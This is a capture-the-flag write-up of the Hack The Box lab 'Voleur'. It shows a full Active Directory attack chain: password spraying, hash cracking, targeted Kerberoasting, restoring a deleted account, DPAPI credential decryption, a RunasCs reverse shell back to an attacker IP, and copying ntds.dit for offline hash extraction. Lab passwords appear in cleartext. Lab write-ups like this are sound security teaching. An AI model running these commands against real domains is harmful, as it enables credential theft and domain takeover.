---
layout: post
title: "Voleur"
date: 2025-11-02
categories: [htb, medium]
provider: htb
machine: voleur
retired: true
---

Dear reader, I apologise. For a few months now I've had far less time to dedicate to HTB machines. I thought I would at least publish the write-ups for the machines I'd been tackling, but even that lost priority, as I left most of the write-ups in a bit of a rough shape. This one was practically finished though, so here I am trying not to be a stranger.

Voleur felt like a step up from [Administrator](/writeups/administrator/), in the sense that I didn't need to learn many new things, especially after going through other machines like [RustyKey](/writeups/rustykey/), [TombWatcher](/writeups/tombwatcher/) and [Puppy](/writeups/puppy/). Ideally, I would have published the write-ups for those already... but here we are. There are quite a few techniques on display though, which I think makes it interesting.

<div class="attack-chain">
  {% include attack-step.html title="Enumerate SMB shares 1" description="Discovered password-protected `Access_Review.xlsx` file in IT shares" type="enum" %}
  {% include attack-step.html title="Exploit weak credentials" description="Cracked password to file with wordlist bruteforce, obtained credentials for `svc_ldap` and other accounts" type="attack" %}
  {% include attack-step.html title="Enumerate Active Directory 1" description="Discovered that `svc_ldap` has `WriteSPN` rights over `svc_winrm`" type="enum" %}
  {% include attack-step.html title="Targeted Kerberoast" description="Abused `WriteSPN` to perform targeted Kerberoast on `svc_winrm`, and cracked the weak password" type="attack" %}
  {% include attack-step.html title="Enumerate Active Directory 2" description="Discovered that `svc_ldap` is part of `Restore_Users` group" type="enum" %}
  {% include attack-step.html title="Lateral movement" description="Started interactive session as `svc_ldap` by using RunasCS with known credentials" type="lateral" %}
  {% include attack-step.html title="Restore user account" description="Used `svc_ldap`'s privileges to restore `todd.wolfe`'s deleted account" type="attack" %}  
  {% include attack-step.html title="Enumerate SMB shares 2" description="Discovered `todd.wolfe`'s Credential Manager store in a backup of their home directory" type="enum" %}
  {% include attack-step.html title="Decrypt Credential Manager store" description="Used `impacket-dpapi` do decrypt store, obtained credentials for `jeremy.combs`" type="attack" %}
  {% include attack-step.html title="Enumerate SMB shares 2" description="Discovered private SSH key in IT share using `jeremy.combs`' access" type="enum" %}
  {% include attack-step.html title="Lateral movement" description="Gained SSH access to `svc_backup` using private key" type="lateral" %}
  {% include attack-step.html title="Enumerate file system" description="Discovered backup of `ntds.dit` and `SECURITY` registry hive" type="enum" %}
  {% include attack-step.html title="Extract secrets from AD database " description="Used `impacket-secretsdump` to extract `Administrator`'s hash from `ntds.dit` offline" type="attack" %}
  {% include attack-step.html title="Overpass the hash" description="Used `Administrator`'s hash to request a TGT ticket, and used the ticket to gain access to the domain controller as `Administrator`" type="root" %}
</div>

## David Holmes' "Snake Eyes" music on
Alright, so, what are we dealing with?
```
$ sudo nmap -p- -sV 10.129.160.124 -vv -oA full-tcp
<SNIP>
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-11 03:13:09Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2222/tcp  open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
<SNIP>
```
We again have a regular, everyday, normal domain controller, except for the SSH service listening on port 2222, which strangely reports running on Ubuntu Linux. Aside from that, we'll probably end up explicitly interacting with SMB, WinRM and maybe LDAP, and everything else we can consider to be noise at least for now.

This is yet another assumed-breach scenario, so we start by confirming our credentials. NTLM is disabled in this domain, so we'll see `STATUS_NOT_SUPPORTED` until we use Kerberos to authenticate. We also need to handle the clock skew with our usual trick:
```
$ netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt'
SMB         10.129.160.124  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.160.124  445    DC               [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED 

$ netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -d voleur.htb
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\ryan.naylor:HollowOct31Nyt KRB_AP_ERR_SKEW  

$ faketime "$(ntpdate -q dc.voleur.htb | cut -d ' ' -f 1,2)" zsh
$ netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -d voleur.htb
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```

Before going ahead and whistling our trusty BloodHound over, I thought I would see what I could see with this account. First step, network shares. Turns out there are a few interesting shares, one of which we can read:
```
$ netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -d voleur.htb --shares
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

I remembered that I had trouble using `smbclient` with Kerberos recently, and I was being lazy, so I decided to just download the contents of the shares we could read (we might want to inspect `SYSVOL` as well soon), again using `netexec`:
```
$ netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -d voleur.htb -M spider_plus -o DOWNLOAD_FLAG=True
<SNIP>
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Downloads successful: 7
SPIDER_PLUS dc.voleur.htb   445    dc               [+] All files processed successfully.
```

Turns out there was only one file in the IT share, but we are looking for quality over quantity. The promisingly-named `Access_Review.xlsx` is an Office spreadsheet, and it is password-protected to boot:
```
$ file ~/.nxc/modules/nxc_spider_plus/dc.voleur.htb/IT/First-Line\ Support/Access_Review.xlsx               
/home/kali/.nxc/modules/nxc_spider_plus/dc.voleur.htb/IT/First-Line Support/Access_Review.xlsx: CDFV2 Encrypted
```

We will either find the credentials later, or we can crack them if they're weak. After extracting the password hash from the file, `hashcat` tells us that yep, it is weak:
```
$ office2john "/home/kali/.nxc/modules/nxc_spider_plus/dc.voleur.htb/IT/First-Line Support/Access_Review.xlsx"
Access_Review.xlsx:$office$*2013*100000*256*16*a<REDACTED>c

$ vim access_review.hash
$ hashcat access_review.hash ../rockyou.txt
<SNIP>
$office$*2013*100000*256*16*a<REDACTED>c:<REDACTED>
```

## Staff only beyond this point
What a treasure trove the file is! We have a list of users, some passwords, and very informative notes. Namely:
- we, Ryan Naylor, are merely a First-Line Support Technician;
- an ex-second-line technician, Todd Wolfe, has had their account removed and password set to something I won't just tell you;
- Jeremy Combs, a third-line technician, seems to be a High-Value Target and in charge of backups, an even higher-valued target;
- we now know the passwords to `svc_ldap` and `svc_iis`, and Lacey Miller might kindly provide us with the one for `svc_winrm`.

Before moving forward, we keep demonstrating `netexec`'s features and try to spray our known passwords over our known users, to see if there's any reuse going on. We only get hits on the credential pairs we know, so no luck there. Everything else gives us a `KDC_ERR_PREAUTH_FAILED` ("incorrect password" in English), or in Todd's deleted account's case, `KDC_ERR_C_PRINCIPAL_UNKNOWN`:
```
$ netexec ldap dc.voleur.htb -u users.txt -p passwords.txt -k -d voleur.htb --continue-on-success
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\Ryan.Naylor:HollowOct31Nyt 
LDAP        dc.voleur.htb   389    DC               [-]
<SNIP>
voleur.htb\Todd.Wolfe:HollowOct31Nyt KDC_ERR_C_PRINCIPAL_UNKNOWN
LDAP        dc.voleur.htb   389    DC               [-] voleur.htb\Jeremy.Combs:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
LDAP        dc.voleur.htb   389    DC               [-]
<SNIP>
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\svc_ldap:<REDACTED> 
<SNIP>
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\svc_iis:<REDACTED>
<SNIP>
```

I realised I hadn't tested the weird Ubuntu SSH login yet, so now was a good time, but we find out we're going to need a private key to use it:
```
$ ssh ryan.naylor@voleur.htb -p 2222
<SNIP>
ryan.naylor@voleur.htb: Permission denied (publickey). 
```

Alright, it's time to take the hound out for a walk:
```
$ bloodhound-ce-python -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -d voleur.htb -ns 10.129.160.124 -c all --zip
<SNIP>
INFO: Done in 00M 05S
INFO: Compressing output into 20250711053856_bloodhound.zip
```

Looking at the results, the most immediately actionable things are the rights that `svc_ldap` has over a few objects. First, it has `GenericWrite` over Lacey's account, which normally allows us to take over their account. The spreadsheet said they might know how to access the `svc_winrm` account, so that sounds like a good way to go. But I tried adding shadow credentials to their account, after getting a TGT ticket for `svc_ldap`, and...
```
$ impacket-getTGT voleur.htb/svc_ldap
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
Password:

[*] Saving ticket in svc_ldap.ccache
$ bloodyAD -k ccache=svc_ldap.ccache -d rustykey.htb --host dc.voleur.htb add shadowCredentials lacey.miller 
Traceback (most recent call last):
  File "/usr/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/lib/python3/dist-packages/bloodyAD/main.py", line 201, in main
    output = args.func(conn, **params)
  File "/usr/lib/python3/dist-packages/bloodyAD/cli_modules/add.py", line 299, in shadowCredentials
    x509.NameAttribute(NameOID.COMMON_NAME, target_dn),
    ~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/cryptography/x509/name.py", line 152, in __init__
    raise ValueError(msg)
ValueError: Attribute's length must be >= 1 and <= 64, but it was 67
```

My excuse at the time for quickly moving on was that "there are [some requirements](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide#add-shadowcredentials) for this technique to work", so before spending too much time debugging this I thought I'd try other low-hanging fruit. It was only when working on this write-up that I noticed I had the wrong domain (`-d rustykey.htb`) in the command I had recycled from the shell history... aaaanyway. I did move on to try a targeted Kerberoast, though that too was unsuccessful, after `hashcat` confirmed that the credentials weren't too weak:
```
$ export KRB5CCNAME=svc_ldap.ccache
$ ~/Repos/targetedKerberoast/targetedKerberoast.py -v -d 'voleur.htb' -u 'svc_ldap' -p '<REDACTED>' -k --request-user 'lacey.miller' --dc-host dc.voleur.htb
[*] Starting kerberoast attacks
[*] Attacking user (lacey.miller)
[VERBOSE] SPN added successfully for (lacey.miller)
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$9<REDACTED>e$f<REDACTED>a
[VERBOSE] SPN removed successfully for (lacey.miller)

$ vim lacey.hash
$ hashcat lacey.hash ../rockyou.txt
<SNIP>
Status...........: Exhausted
<SNIP>
```

Huh... ok, well, `svc_ldap` also has `WriteSPN` rights directly over `svc_winrm`, so we can try a targeted Kerberoast of that account as well:
```
$ ~/Repos/targetedKerberoast/targetedKerberoast.py -v -d 'voleur.htb' -u 'svc_ldap' -p '<REDACTED>' -k --request-user 'svc_winrm' --dc-host dc.voleur.htb   
[*] Starting kerberoast attacks
[*] Attacking user (svc_winrm)
[VERBOSE] SPN added successfully for (svc_winrm)
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$b<REDACTED>9$9<REDACTED>d
[VERBOSE] SPN removed successfully for (svc_winrm)

$ vim winrm.hash
$ hashcat winrm.hash ../rockyou.txt
<SNIP>
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$b<REDACTED>9$9<REDCTED>d:<REDACTED>
```

Great success! By the way, I know what you're thinking. Lacey knows to set a strong password for herself, and then goes and sets a weak password for this service account... _Pfft!_ Well, I gotta say, that's the strongest weak password I've ever seen. Alas, your strong passwords can still get leaked, and I guess our fictional support technician had an account on [Rockyou](https://en.wikipedia.org/wiki/RockYou).

I tried a spray of this new password, for good measure, but with no new hits. So, we get ourselves a new TGT ticket, set up our Kerberos configuration again with the help of `netexec`, and \[hacker voice\] _we're in_:
```
$ impacket-getTGT voleur.htb/svc_winrm
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
Password:

[*] Saving ticket in svc_winrm.ccache

$ netexec smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -d voleur.htb --generate-krb5-file ./krb5.conf  
<SNIP>

$ sudo cp krb5.conf /etc/krb5.conf              
$ evil-winrm -i dc.voleur.htb -u 'svc_winrm' -r VOLEUR.HTB
<SNIP>
*Evil-WinRM* PS C:\Users\svc_winrm\Documents>  
```

## Reanimation room
A foothold on the machine is important, and we got our user flag, but it looks like we won't get much more out of this account. We do get a particularly important piece of information - even if we don't have access to them, we can see that there are more folders in the `IT` share than just the first-level one we knew of:
```
*Evil-WinRM* PS C:\IT> dir

    Directory: C:\IT

Mode                 LastWriteTime         Length Name 
----                 -------------         ------ ---- 
d-----         1/29/2025   1:40 AM                First-Line Support
d-----         1/29/2025   7:13 AM                Second-Line Support
d-----         1/30/2025   8:11 AM                Third-Line Support

*Evil-WinRM* PS C:\IT> cd "Second-Line Support"
*Evil-WinRM* PS C:\IT\Second-Line Support> dir
Access to the path 'C:\IT\Second-Line Support' is denied.
```

Aside from this, the account has no particular privilege, and nothing else on the parts of the file system that it can access looks interesting for now. A quick `netstat -ano` doesn't show any additional services running locally either. But before we go too deep into something like credential-hunting or checking for vulnerable software, there are two lower-hanging fruit that I want to try.

First, we also have valid credentials for `svc_iis`. I'll spare you the details though, because nothing of note came out of a quick enumeration of it. More importantly though, back to our `svc_ldap` account, BloodHound also told us that it is part of a "Restore_Users" group. Knowing that Todd Wolfe's account had been removed, and off the heels of the [TombWatcher](/writeups/tombwatcher/) box where we learned about restoring deleted AD objects, this was ringing a _lot_ of bells.

`svc_ldap` does not have the right to login remotely, but now that we have access via `svc_winrm`, we can use [RunasCS](https://github.com/antonioCoco/RunasCs). Also off the heels of [RustyKey](/writeups/rustykey/), I was _too_ familiar with how to use it properly, and used it to connect back to our attack machine:
```
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> upload runas.ps1
<SNIP>
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Import-Module ./runas.ps1
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Invoke-RunasCs svc_ldap <REDACTED> -Command "cmd.exe" -Remote 10.10.14.138:1234 -ProcessTimeout 0

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-258c97$\Default 
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1644 created in background.
```

Back on our machine, where our listener was setup, we get a connection and a session as `svc_ldap`:
```
$ rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.138] from (UNKNOWN) [10.129.160.124] 54194
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami
whoami
voleur\svc_ldap
```

Cool! We get right to work looking for deleted objects, and aside from the container itself, we do indeed find poor Todd:
```
C:\Windows\system32> powershell
<SNIP>
PS C:\Windows\system32> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
<SNIP>
Description                     : Second-Line Support Technician
DisplayName                     : Todd Wolfe
DistinguishedName               : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted 
                                  Objects,DC=voleur,DC=htb
<SNIP>
```

We perform our dark magic and confirm we did bring him back:
```
PS C:\Windows\system32> Get-ADObject -Filter 'ObjectGUID -eq "1c6b1deb-c372-4cbb-87b1-15031de169db"' -IncludeDeletedObjects |Restore-ADObject

PS C:\Windows\system32> net users
net users

User accounts for \\DC
-------------------------------------------------------------------------------
Administrator            krbtgt                   svc_ldap                 
todd.wolfe               

The command completed successfully.
```

Without wasting time, we spider the shares that Tom can access, as he's a member of the second-line support group and can probably see into the respective directory in the `IT` share. This was taking quite a bit of time to resolve, so I canceled that first try and checked for what might be wrong. When everything looked ok, I started it again, and luckily I didn't set the option to automatically download all the files:
```
$ netexec smb dc.voleur.htb -u 'todd.wolfe' -p 'NightT1meP1dg3on14' -k -d voleur.htb -M spider_plus
<SNIP>
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Total folders found:  763
SPIDER_PLUS dc.voleur.htb   445    dc               [*] Total files found:    486
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size average:    126.48 KB
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size min:        0 B
SPIDER_PLUS dc.voleur.htb   445    dc               [*] File size max:        25.5 MB
```

Whoa, ok, what's in there? Checking the spider's metadata result, it's clear that someone made a copy of Todd's old home directory into the share:
```
$ head ~/.nxc/modules/nxc_spider_plus/dc.voleur.htb.json    
{
    "IT": {
        "Second-Line Support/Archived Users/todd.wolfe/3D Objects/desktop.ini": {
            "atime_epoch": "2025-01-29 16:13:06",
            "ctime_epoch": "2025-01-29 16:13:06",
            "mtime_epoch": "2025-01-29 13:53:09",
            "size": "298 B"
        },
        "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/ConnectedDevicesPlatform/CDPGlobalSettings.cdp": {
            "atime_epoch": "2025-01-29 16:13:06",
```

I actually never checked, but I assume that if we logged in as Todd we wouldn't find these files. We restored his AD object, but that doesn't mean restoring any files that would have been deleted when the account was removed.

I keep referring to other recent machines in this write-up, but it did have sort of a capstone feel. So, again, off the heels of [Puppy](/writeups/puppy/), my first thought was to check for Credential Manager files, and indeed there were some:
```
$ grep "Protect" ~/.nxc/modules/nxc_spider_plus/dc.voleur.htb.json
        "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/CREDHIST": {
        "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88": {
        "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/BK-VOLEUR": {
        "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/Preferred": {
        "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/SYNCHIST": {

$ grep "Credentials" ~/.nxc/modules/nxc_spider_plus/dc.voleur.htb.json
        "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Credentials/DFBE70A7E5CC19A398EBF1B96859CE5D": {
        "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3": {
```

I could feel the root flag getting close, but I'd first need to download those files, and I sure didn't want to download 480 other files as collateral damage.

## Jezza's account
It was finally time to troubleshoot `smbclient`'s refusal to work with Kerberos. My woes had been caused by some [very old documentation](https://cwiki.apache.org/confluence/display/DIRxINTEROP/Using+Kerberos+Credentials+with+smbclient), giving me a set of arguments that absolutely did not work:
```
$ smbclient -U "voleur.htb\todd.wolfe" -k -W VOLEUR.HTB "\\\\dc.voleur.htb\\IT"
WARNING: The option -k|--kerberos is deprecated!
gensec_spnego_client_negTokenInit_step: Could not find a suitable mechtype in NEG_TOKEN_INIT
session setup failed: NT_STATUS_INVALID_PARAMETER
```

Luckily [I wasn't alone](https://unix.stackexchange.com/questions/722817/the-kerberos-option-is-deprecated-on-smbclient-but-is-the-only-option-working), and with the help of that bit of research and some trial and error, this is what does work (assuming, of course, that your `ccache` is setup and valid):
```
$ smbclient "\\\\dc.voleur.htb\\IT" --use-kerberos=required
Try "help" to get a list of possible commands.
smb: \> 
```

The box's cleanup script re-deleting Todd's account was quite aggressive, so there's no time to waste:
```
smb: \> cd "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/"
smb: \Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\> get 08949382-134f-4c63-b93c-ce52efc0aa88 
getting file \Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88 of size 740 as 08949382-134f-4c63-b93c-ce
52efc0aa88 (7.3 KiloBytes/sec) (average 7.3 KiloBytes/sec)
smb: \Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\> cd \
smb: \> cd "Second-Line Support/Archived Users/todd.wolfe/AppData/Local/Microsoft/Credentials/"
smb: \Second-Line Support\Archived Users\todd.wolfe\AppData\Local\Microsoft\Credentials\> get DFBE70A7E5CC19A398EBF1B96859CE5D 
getting file \Second-Line Support\Archived Users\todd.wolfe\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D of size 11068 as DFBE70A7E5CC19A398EBF1B96859CE5D (104.9 KiloBytes/sec) (average 41.4 Kilo
Bytes/sec)
smb: \Second-Line Support\Archived Users\todd.wolfe\AppData\Local\Microsoft\Credentials\> cd \
smb: \> cd "Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/"             
smb: \Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\> get 772275FAD58525253490A9B0039791D3 
getting file \Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3 of size 398 as 772275FAD58525253490A9B0039791D3 (3.8 KiloBytes/sec) (average 31.9 KiloBy
tes/sec)
```

Time to get cracking! First, the master key, using Todd's SID and credentials:
```
$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password '<REDACTED>'
<SNIP>
Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd<REDACTED>3
```

Then, the credentials, using the master key. The roaming one is the one we're interested in:
```
$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key '0xd<REDACTED>3' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : <REDACTED>
```

Woop woop, we've made it to level 3!
```
$ impacket-getTGT voleur.htb/jeremy.combs
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in jeremy.combs.ccache

$ export KRB5CCNAME=jeremy.combs.ccache
$ evil-winrm -i dc.voleur.htb -u 'jeremy.combs'  -r VOLEUR.HTB
<SNIP>

*Evil-WinRM* PS C:\Users\jeremy.combs\Documents>  
```

## Level 3
We quickly check for privileges, where nothing stands out, and then head straight to that third-level `IT` folder:
```
*Evil-WinRM* PS C:\IT\Third-Line Support> dir

    Directory: C:\IT\Third-Line Support

Mode                 LastWriteTime         Length Name 
----                 -------------         ------ ---- 
d-----         1/30/2025   8:11 AM                Backups
-a----         1/30/2025   8:10 AM           2602 id_rsa
-a----         1/30/2025   8:07 AM            186 Note.txt.txt

*Evil-WinRM* PS C:\IT\Third-Line Support> download id_rsa
Info: Downloading C:\IT\Third-Line Support\id_rsa to id_rsa
Info: Download successful!

*Evil-WinRM* PS C:\IT\Third-Line Support> type Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

Ok, we've got:
- a pissed off Admin;
- the private key we'd been waiting for to use on port 2222;
- and a `Backups` folder that...
```
*Evil-WinRM* PS C:\IT\Third-Line Support\Backups> dir
Access to the path 'C:\IT\Third-Line Support\Backups' is denied.
```

... we can't access. No problem, no problem, we have other things to entertain ourselves with. Let's test that private key, with a hunch that it belongs to the `svc_backup` user based on Admin's frustrated note:
```
$ chmod 0600 id_rsa
$ ssh -i id_rsa svc_backup@voleur.htb -p 2222                                                               
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)
<SNIP>
svc_backup@DC:~$  
```

Well, the note pretty much said it, but we are now in an Ubuntu Linux subsystem in Windows. In other words, we have effectively landed in a Linux shell, so you know what I'm going to do next:
```
svc_backup@DC:~$ id
uid=1000(svc_backup) gid=1000(svc_backup) groups=1000(svc_backup),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
svc_backup@DC:~$ sudo -l
Matching Defaults entries for svc_backup on DC:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

Oh. Don't mind if I do:
```
svc_backup@DC:~$ sudo su
root@DC:/home/svc_backup#  
```

Ok... we are now _root_ in this Ubuntu Linux subsystem in Windows. I haven't played around with WSL much, so for the first time in the box I wasn't too sure how to proceed. Was I supposed to break out into the host, for example? Before going there, I looked around, and there was nothing to be found in `svc_backup`'s or `root`'s home. As root I could get `/etc/shadow`'s contents, but the only credentials in it (`svc_backup`'s) didn't crack. It wasn't until after I checked a few other locations like `/opt` and `/var` that I thought of checking for mounted file systems:
```
root@DC:/# cd /mnt/
root@DC:/mnt# ls -lah
total 0
drwxr-xr-x 1 root       root       4.0K Jan 30 03:46 .
drwxr-xr-x 1 root       root       4.0K Jan 30 03:46 ..
drwxrwxrwx 1 svc_backup svc_backup 4.0K Jun 30 14:08 c
```

_Ooooooh..._ Well, first things first:
```
root@DC:/mnt/# cd c/Users/Administrator/
root@DC:/mnt/c/Users/Administrator# ls
ls: cannot open directory '.': Permission denied
```

Heheh yeah ok, fair enough. Had to try. Oh, but what about that `Backups` folder we saw earlier?
```
root@DC:/mnt/c/IT/Third-Line Support# cd Backups/
root@DC:/mnt/c/IT/Third-Line Support/Backups# ls -lah
total 0
drwxrwxrwx 1 svc_backup svc_backup 4.0K Jan 30 08:11  .
dr-xr-xr-x 1 svc_backup svc_backup 4.0K Jan 30 08:11  ..
drwxrwxrwx 1 svc_backup svc_backup 4.0K Jan 30 03:49 'Active Directory'
drwxrwxrwx 1 svc_backup svc_backup 4.0K Jan 30 03:49  registry

root@DC:/mnt/c/IT/Third-Line Support/Backups# cd registry
root@DC:/mnt/c/IT/Third-Line Support/Backups/registry# ls -lah
total 18M
drwxrwxrwx 1 svc_backup svc_backup 4.0K Jan 30 03:49 .
drwxrwxrwx 1 svc_backup svc_backup 4.0K Jan 30 08:11 ..
-rwxrwxrwx 1 svc_backup svc_backup  32K Jan 30 03:30 SECURITY
-rwxrwxrwx 1 svc_backup svc_backup  18M Jan 30 03:30 SYSTEM

root@DC:/mnt/c/IT/Third-Line Support/Backups/registry# cd "../Active\ Directory/"
root@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory# ls -lah
total 25M
drwxrwxrwx 1 svc_backup svc_backup 4.0K Jan 30 03:49 .
drwxrwxrwx 1 svc_backup svc_backup 4.0K Jan 30 08:11 ..
-rwxrwxrwx 1 svc_backup svc_backup  24M Jan 30 03:49 ntds.dit
-rwxrwxrwx 1 svc_backup svc_backup  16K Jan 30 03:49 ntds.jfm
```

Nice backups guys! That `ntds.dit` file contains the hashed credentials of _every_ user in the domain, admins included, and we have the `SECURITY` registry hive to unlock it. Let's get those files:
```
$ scp -i id_rsa -P 2222 svc_backup@voleur.htb:"/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" .
<SNIP>
$ scp -i id_rsa -P 2222 svc_backup@voleur.htb:"/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY" .
<SNIP>
```

